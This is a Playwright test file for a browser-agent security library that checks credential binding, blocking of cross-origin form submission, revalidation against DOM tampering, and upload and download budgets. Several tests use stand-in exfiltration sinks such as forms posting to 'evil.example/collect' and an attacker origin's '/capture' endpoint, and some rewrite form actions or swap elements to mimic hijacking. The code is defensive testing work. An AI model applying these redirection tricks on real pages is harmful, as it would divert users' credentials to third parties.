import { chromium } from "playwright";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import {
  fingerprint,
  serializeHandle,
  type ActionIntent,
  type PolicyEngine,
  OpenAgentFence,
} from "@openagentfence/core";
import { expectNoRawSecretIn, fixtureSentinel, startFixtureServer } from "@openagentfence/testing";
import { inMemoryVault } from "@openagentfence/vault";
import {
  currentState,
  PlaywrightRevalidationError,
  playwrightAdapter,
  PlaywrightHelperRegistry,
  wrapPage,
  type PlaywrightOperation,
} from "../../src/index.js";
import type { Browser } from "playwright";

let browser: Browser;

beforeAll(async () => {
  browser = await chromium.launch();
});

afterAll(async () => {
  await browser.close();
});

describe("guarded Playwright execution (OAF-BROWSER-002/014)", () => {
  it("materializes a bound password only in the final exact Playwright fill", async () => {
    const fixtures = await startFixtureServer();
    const page = await browser.newPage();
    const origin = fixtures.origins[0];
    const attacker = fixtures.origins[1];
    if (origin === undefined || attacker === undefined) throw new Error("fixture origin missing");
    const sentinel = fixtureSentinel();
    try {
      await page.goto(`${origin.origin}/secret-form`);
      const session = new OpenAgentFence({
        adapter: playwrightAdapter(page),
        vault: inMemoryVault(),
      }).start({
        task: "sign in to the local synthetic fixture",
        capabilities: {
          credentials: true,
          externalCommunication: true,
          privateNetwork: true,
        },
        origins: { allow: [origin.origin] },
        secrets: [
          {
            name: "login-password",
            kind: "CREDENTIAL",
            origins: [origin.origin],
            fieldTypes: ["password"],
            selector: "#password",
            formAction: `${origin.origin}/capture`,
          },
        ],
      });
      const handle = await session.registerSecret("login-password", sentinel, "CREDENTIAL");
      const secure = wrapPage(session, page);

      await secure.locator("#password").fill(serializeHandle(handle));
      await secure.click("#submit");
      await expect
        .poll(() => fixtures.requests.some((request) => request.url === "/capture"))
        .toBe(true);

      const delivered = fixtures.requests.filter((request) => request.body.includes(sentinel));
      expect(delivered).toHaveLength(1);
      expect(delivered[0]?.origin).toBe(origin.origin);
      expect(
        fixtures.requests.filter(
          (request) => request.origin === attacker.origin && request.body.includes(sentinel),
        ),
      ).toEqual([]);
      const trace = await session.end();
      expect(expectNoRawSecretIn(trace, sentinel)).toBe(true);
    } finally {
      await page.close();
      await fixtures.close();
    }
  });

  it("revalidates a mutated form action before lookup and delivers zero secret bytes", async () => {
    const fixtures = await startFixtureServer();
    const page = await browser.newPage();
    const origin = fixtures.origins[0];
    const attacker = fixtures.origins[1];
    if (origin === undefined || attacker === undefined) throw new Error("fixture origin missing");
    const sentinel = fixtureSentinel();
    try {
      await page.goto(`${origin.origin}/secret-form`);
      const session = new OpenAgentFence({
        adapter: playwrightAdapter(page),
        vault: inMemoryVault(),
      }).start({
        task: "reject a mutated synthetic fixture sink",
        capabilities: { credentials: true },
        secrets: [
          {
            name: "login-password",
            kind: "CREDENTIAL",
            origins: [origin.origin],
            fieldTypes: ["password"],
            selector: "#password",
            formAction: `${origin.origin}/capture`,
          },
        ],
      });
      const handle = await session.registerSecret("login-password", sentinel, "CREDENTIAL");
      const originalExecute = session.executeAuthorized.bind(session);
      let mutated = false;
      vi.spyOn(session, "executeAuthorized").mockImplementation(async (authorized) => {
        if (!mutated) {
          mutated = true;
          await page.locator("#secret-form").evaluate((form, action) => {
            (form as unknown as { action: string }).action = action;
          }, `${attacker.origin}/capture`);
        }
        return originalExecute(authorized);
      });

      await expect(
        wrapPage(session, page).locator("#password").fill(serializeHandle(handle)),
      ).rejects.toThrow();
      expect(await page.locator("#password").inputValue()).toBe("");
      expect(fixtures.requests.some((request) => request.body.includes(sentinel))).toBe(false);
      expect(expectNoRawSecretIn(await session.end(), sentinel)).toBe(true);
    } finally {
      await page.close();
      await fixtures.close();
    }
  });

  it("blocks a tainted cross-origin form before the attacker receives any bytes", async () => {
    const fixtures = await startFixtureServer();
    const page = await browser.newPage();
    const [origin, attacker] = fixtures.origins;
    if (origin === undefined || attacker === undefined) throw new Error("fixture origin missing");
    const sentinel = fixtureSentinel();
    try {
      await page.goto(`${origin.origin}/secret-form`);
      const session = new OpenAgentFence({ adapter: playwrightAdapter(page) }).start({
        task: "keep tainted form data on the current origin",
        capabilities: {
          navigation: "allowlist",
          externalCommunication: true,
          privateNetwork: true,
        },
        // A navigation allowlist is not a data/sink binding.
        origins: { allow: [origin.origin, attacker.origin] },
      });
      const secure = wrapPage(session, page);
      await secure.locator("#password").fill(sentinel);
      await session.observe();
      await page.locator("#secret-form").evaluate((form, action) => {
        (form as unknown as { action: string }).action = action;
      }, `${attacker.origin}/capture`);

      const before = fixtures.requests.filter(
        (request) => request.origin === attacker.origin,
      ).length;
      await expect(secure.click("#submit")).rejects.toThrow("untrusted_cross_origin_egress");
      expect(
        fixtures.requests.filter((request) => request.origin === attacker.origin),
      ).toHaveLength(before);
      const trace = await session.end();
      expect(expectNoRawSecretIn(trace, sentinel)).toBe(true);
      expect(
        trace.events.some(
          (event) =>
            event.kind === "policy_decision" &&
            Array.isArray(event.data["reasons"]) &&
            event.data["reasons"].includes("untrusted_cross_origin_egress"),
        ),
      ).toBe(true);
    } finally {
      await page.close();
      await fixtures.close();
    }
  });

  it("redacts framework errors after a secret has resolved", async () => {
    const fixtures = await startFixtureServer();
    const page = await browser.newPage();
    const origin = fixtures.origins[0];
    if (origin === undefined) throw new Error("fixture origin missing");
    const sentinel = fixtureSentinel();
    try {
      await page.goto(`${origin.origin}/secret-form`);
      await page.locator("#password").evaluate((node) => node.setAttribute("readonly", ""));
      page.setDefaultTimeout(100);
      const session = new OpenAgentFence({
        adapter: playwrightAdapter(page),
        vault: inMemoryVault(),
      }).start({
        task: "exercise a synthetic secret sink error",
        capabilities: { credentials: true },
        secrets: [
          {
            name: "login-password",
            kind: "CREDENTIAL",
            origins: [origin.origin],
            fieldTypes: ["password"],
            selector: "#password",
            formAction: `${origin.origin}/capture`,
          },
        ],
      });
      const handle = await session.registerSecret("login-password", sentinel, "CREDENTIAL");
      const failure = await wrapPage(session, page)
        .locator("#password")
        .fill(serializeHandle(handle))
        .catch((error: unknown) => error);
      expect(expectNoRawSecretIn(failure, sentinel)).toBe(true);
      expect(expectNoRawSecretIn(await session.end(), sentinel)).toBe(true);
    } finally {
      await page.close();
      await fixtures.close();
    }
  });

  it("authorizes, revalidates, and executes an exact locator operation once", async () => {
    const page = await browser.newPage();
    await page.setContent('<input id="name"><button id="go">go</button>');
    const firewall = new OpenAgentFence({ adapter: playwrightAdapter(page) });
    const session = firewall.start({ task: "complete a local form" });
    const secure = wrapPage(session, page);

    await secure.locator("#name").fill("Ada");
    await secure.click("#go");

    expect(await page.locator("#name").inputValue()).toBe("Ada");
    expect("evaluate" in secure).toBe(false);
    await session.end();
    await page.close();
  });

  it("executes only a registered application helper and traces its name and hash", async () => {
    const page = await browser.newPage();
    await page.setContent('<input id="name">');
    let executions = 0;
    const helpers = new PlaywrightHelperRegistry([
      {
        name: "set-name",
        sha256: "a".repeat(64),
        execute: async (rawPage, args) => {
          executions += 1;
          const value = (args as { readonly value: string }).value;
          await rawPage.locator("#name").fill(value);
        },
      },
    ]);
    const session = new OpenAgentFence({ adapter: playwrightAdapter(page, { helpers }) }).start({
      task: "use an application helper",
      capabilities: { executeScript: true },
    });
    const secure = wrapPage(session, page, helpers);

    await secure.executeHelper("set-name", { value: "Ada" });
    expect(() => secure.executeHelper("missing", {})).toThrow("not registered");
    expect(executions).toBe(1);
    expect(await page.locator("#name").inputValue()).toBe("Ada");
    const trace = await session.end();
    expect(JSON.stringify(trace)).toContain("set-name");
    expect(JSON.stringify(trace)).toContain("a".repeat(64));
    await page.close();
  });

  it("closes a post-creation popup when the shared tab budget is exhausted", async () => {
    const page = await browser.newPage();
    const session = new OpenAgentFence({ adapter: playwrightAdapter(page) }).start({
      task: "do not open tabs",
      budgets: { maxTabs: 0 },
    });
    const popup = page.waitForEvent("popup");
    await page.evaluate(() =>
      (globalThis as unknown as { open(url: string): unknown }).open("https://popup.example/"),
    );
    await popup;
    await expect.poll(() => page.context().pages().length).toBe(1);
    expect(session.riskState).toBe("QUARANTINED");
    await session.end();
    await page.close();
  });

  it("executes one locally approved shopping action exactly once", async () => {
    const page = await browser.newPage();
    await page.setContent(
      '<button id="buy" onclick="window.__purchases = (window.__purchases || 0) + 1">Buy</button>',
    );
    const adapter = playwrightAdapter(page);
    const policy: PolicyEngine = {
      policyHash: "local-shopping-approval",
      evaluate: () => ({
        verdict: "REQUIRE_APPROVAL",
        reasons: ["approval_required"],
        requiredApproval: true,
        matchedRules: [],
        policyHash: "local-shopping-approval",
      }),
    };
    let approvals = 0;
    const session = new OpenAgentFence({
      adapter,
      policy,
      approvalHandler: {
        requestApproval: async () => {
          approvals += 1;
          return { approved: true, scope: "once" };
        },
      },
    }).start({ task: "buy from the local fixture" });
    const observation = await adapter.observe();
    const operation: PlaywrightOperation = {
      adapter: "playwright",
      method: "click",
      selector: "#buy",
      arguments: [],
    };
    const action = {
      type: "CLICK" as const,
      target: { element: "#buy", origin: observation.origin },
      instructionProvenance: { trust: "application" as const },
      raw: operation,
    };
    const state = await currentState(page, observation, operation, policy.policyHash);
    const now = Date.now();
    const bound = await session.authorizeBound(action, {
      intentId: "local-shopping-intent",
      actionId: "local-shopping-action",
      action,
      observation: state.observation,
      target: state.target,
      ...(state.frameOrigin !== undefined ? { frameOrigin: state.frameOrigin } : {}),
      securityAttributes: state.securityAttributes,
      visibility: state.visibility,
      policyHash: policy.policyHash,
      operationHash: state.operationHash,
      createdAt: now,
      expiresAt: now + 10_000,
    });
    const authorized = bound.authorized;
    if (authorized === undefined) throw new Error("local shopping approval unexpectedly denied");
    await session.executeAuthorized(authorized);
    await expect(session.executeAuthorized(authorized)).rejects.toThrow(TypeError);
    expect(approvals).toBe(1);
    expect(await page.evaluate(() => (globalThis as { __purchases?: number }).__purchases)).toBe(1);
    await session.end();
    await page.close();
  });

  it("classifies a cross-origin submit control as SUBMIT and blocks it before the request", async () => {
    const page = await browser.newPage();
    await page.setContent(
      '<form action="https://evil.example/collect" method="post"><input name="email"><button id="submit" type="submit">Send</button></form>',
    );
    const session = new OpenAgentFence({ adapter: playwrightAdapter(page) }).start({
      task: "local form",
    });
    await expect(wrapPage(session, page).click("#submit")).rejects.toThrow("blocked");
    expect(page.url()).toBe("about:blank");
    await session.end();
    await page.close();
  });

  it("classifies Enter in a form control as SUBMIT before it can navigate", async () => {
    const page = await browser.newPage();
    await page.setContent(
      '<form action="https://evil.example/collect" method="post"><input id="email" name="email"></form>',
    );
    const decisions: string[] = [];
    const session = new OpenAgentFence({ adapter: playwrightAdapter(page) }).start({
      task: "local form",
    });
    session.on("decision", (decision) => decisions.push(decision.action.type));
    await expect(wrapPage(session, page).locator("#email").press("Enter")).rejects.toThrow(
      "blocked",
    );
    expect(decisions).toContain("SUBMIT");
    expect(page.url()).toBe("about:blank");
    await session.end();
    await page.close();
  });

  it("blocks unapproved uploads before file access and accepts bounded trusted payloads", async () => {
    const page = await browser.newPage();
    await page.setContent(
      '<form action="https://upload.example/receive" method="post"><input id="upload" type="file"></form>',
    );
    const blocked = new OpenAgentFence({ adapter: playwrightAdapter(page) }).start({
      task: "no upload permission",
    });
    const file = { name: "note.txt", mimeType: "text/plain", buffer: Buffer.from("local note") };
    await expect(
      wrapPage(blocked, page).locator("#upload").setInputFiles([file], {
        provenance: "application",
        sensitivity: "public",
        taskNecessary: true,
      }),
    ).rejects.toThrow("blocked");
    expect(
      await page
        .locator("#upload")
        .evaluate((input) => (input as unknown as { files?: { length: number } }).files?.length),
    ).toBe(0);
    await blocked.end();

    const allowed = new OpenAgentFence({ adapter: playwrightAdapter(page) }).start({
      task: "upload a local note",
      capabilities: { uploads: true, navigation: "allowlist" },
      origins: { allow: ["https://upload.example"] },
    });
    await wrapPage(allowed, page).locator("#upload").setInputFiles([file], {
      provenance: "user",
      sensitivity: "sensitive",
      taskNecessary: true,
    });
    expect(
      await page.locator("#upload").evaluate(
        (input) =>
          (
            input as unknown as {
              files?: { readonly [index: number]: { readonly name: string } };
            }
          ).files?.[0]?.name,
      ),
    ).toBe("note.txt");
    await allowed.end();
    await page.close();
  });

  it("returns bounded metadata only after a guarded local download", async () => {
    const page = await browser.newPage();
    await page.route("https://downloads.example/invoice", (route) =>
      route.fulfill({
        body: "invoice fixture",
        contentType: "application/pdf",
        headers: { "content-disposition": 'attachment; filename="invoice.pdf"' },
      }),
    );
    await page.setContent(
      '<a id="invoice" href="https://downloads.example/invoice" download>Invoice</a>',
    );
    const session = new OpenAgentFence({ adapter: playwrightAdapter(page) }).start({
      task: "download an invoice",
      capabilities: { downloads: true },
      budgets: { maxDownloads: 1, maxDownloadBytes: 1_024 },
    });
    const metadata = await wrapPage(session, page).download("#invoice");
    expect(metadata).toMatchObject({
      sourceOrigin: "https://downloads.example",
      mimeType: "application/pdf",
      filename: "invoice.pdf",
      bytes: 15,
    });
    expect(metadata.sha256).toMatch(/^[0-9a-f]{64}$/);
    await session.end();
    await page.close();
  });

  it("blocks a target mutation between authorization and execution before side effect", async () => {
    const page = await browser.newPage();
    await page.setContent('<button id="go" onclick="window.__clicked = true">go</button>');
    const adapter = playwrightAdapter(page);
    const observation = await adapter.observe();
    const operation: PlaywrightOperation = {
      adapter: "playwright",
      method: "click",
      selector: "#go",
      arguments: [],
    };
    const action = {
      type: "CLICK" as const,
      target: { element: "#go", origin: observation.origin },
      instructionProvenance: { trust: "application" as const },
      raw: operation,
    };
    const state = await currentState(page, observation, operation, "test-policy");
    const now = Date.now();
    const intent: ActionIntent = {
      intentId: "intent-target-mutation",
      actionId: "action-target-mutation",
      action,
      observation: state.observation,
      target: state.target,
      ...(state.frameOrigin !== undefined ? { frameOrigin: state.frameOrigin } : {}),
      ...(state.destination !== undefined ? { destination: state.destination } : {}),
      ...(state.formAction !== undefined ? { formAction: state.formAction } : {}),
      securityAttributes: state.securityAttributes,
      visibility: state.visibility,
      policyHash: state.policyHash,
      operationHash: state.operationHash,
      createdAt: now,
      expiresAt: now + 10_000,
    };
    const session = new OpenAgentFence({ adapter }).start({ task: "test target mutation" });
    const bound = await session.authorizeBound(action, {
      ...intent,
      policyHash: session.policyEngine.policyHash,
    });
    const authorized = bound.authorized;
    if (authorized === undefined) throw new Error("test authorization unexpectedly denied");
    await page.locator("#go").evaluate((node) => node.setAttribute("aria-disabled", "true"));

    await expect(session.executeAuthorized(authorized)).rejects.toBeInstanceOf(
      PlaywrightRevalidationError,
    );
    expect(
      await page.evaluate(() => (globalThis as { __clicked?: boolean }).__clicked === true),
    ).toBe(false);
    await page.close();
  });

  it("refuses a same-selector replacement after wrapper binding before side effect", async () => {
    const page = await browser.newPage();
    await page.setContent('<button id="go" onclick="window.__attackerClicked = true">go</button>');
    const session = new OpenAgentFence({ adapter: playwrightAdapter(page) }).start({
      task: "exact target replacement fixture",
    });
    const secure = wrapPage(session, page);
    const executeAuthorized = session.executeAuthorized.bind(session);
    vi.spyOn(session, "executeAuthorized").mockImplementation(async (authorized) => {
      await page.locator("#go").evaluate((node) => {
        node.outerHTML = '<button id="go" onclick="window.__attackerClicked = true">go</button>';
      });
      return executeAuthorized(authorized);
    });

    await expect(secure.click("#go")).rejects.toThrow();
    expect(
      await page.evaluate(
        () => (globalThis as { __attackerClicked?: boolean }).__attackerClicked === true,
      ),
    ).toBe(false);
    await page.close();
  });

  it("rejects expired intent before resolving the target", async () => {
    const page = await browser.newPage();
    await page.setContent('<button id="go">go</button>');
    const adapter = playwrightAdapter(page);
    const observation = await adapter.observe();
    const operation: PlaywrightOperation = {
      adapter: "playwright",
      method: "click",
      selector: "#go",
      arguments: [],
    };
    const action = {
      type: "CLICK" as const,
      target: { element: "#go", origin: observation.origin },
      instructionProvenance: { trust: "application" as const },
      raw: operation,
    };
    const state = await currentState(page, observation, operation, "test-policy");
    const intent: ActionIntent = {
      intentId: "intent-expired",
      actionId: fingerprint("action-expired"),
      action,
      observation: state.observation,
      target: state.target,
      ...(state.frameOrigin !== undefined ? { frameOrigin: state.frameOrigin } : {}),
      securityAttributes: state.securityAttributes,
      visibility: state.visibility,
      policyHash: state.policyHash,
      operationHash: state.operationHash,
      createdAt: 0,
      expiresAt: 1,
    };
    const session = new OpenAgentFence({ adapter }).start({ task: "test expiry" });
    const bound = await session.authorizeBound(action, {
      ...intent,
      policyHash: session.policyEngine.policyHash,
    });
    expect(bound.authorized).toBeUndefined();

    expect(bound.decision.reasons).toContain("action_intent_expired");
    await page.close();
  });
});
